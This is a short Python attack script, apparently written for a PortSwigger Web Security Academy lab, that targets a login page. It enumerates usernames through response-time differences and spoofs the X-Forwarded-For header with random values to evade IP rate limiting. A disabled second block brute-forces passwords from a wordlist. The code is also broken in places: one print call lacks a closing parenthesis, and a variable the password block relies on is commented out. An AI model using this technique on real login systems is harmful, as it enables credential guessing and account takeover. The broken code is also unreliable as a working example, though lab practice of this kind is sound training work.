import requests, random

url = 'https://0a8f0044048df27f81da808b009a007c.web-security-academy.net/login'


lines = [line.strip() for line in open("../users.txt", "r")]
times = {}
for line in lines:
    payload = {"username" : line, "password" : "uwu"}
    headers = {"X-Forwarded-For" : str(random.randint(1, 100000))}
    owo = requests.post(url, data=payload, headers=headers)
    print(format(owo.elapsed.total_seconds())
    times[line] = owo.elapsed.total_seconds()

print(times)
#result = max(times, key=times.get)
#print(result)

"""
lines = [line.strip() for line in open("../pass.txt", "r")]
for line in lines:
    payload = {"username" : result, "password" : line}
    headers = {"X-Forwarded-For" : str(random.randint(1, 100000))}
    owo = requests.post(url, data=payload, headers=headers, allow_redirects=False)
    if owo.status_code in (300, 301, 302, 303, 307, 308):
        print(result + ":" + line)
        exit(0)
"""
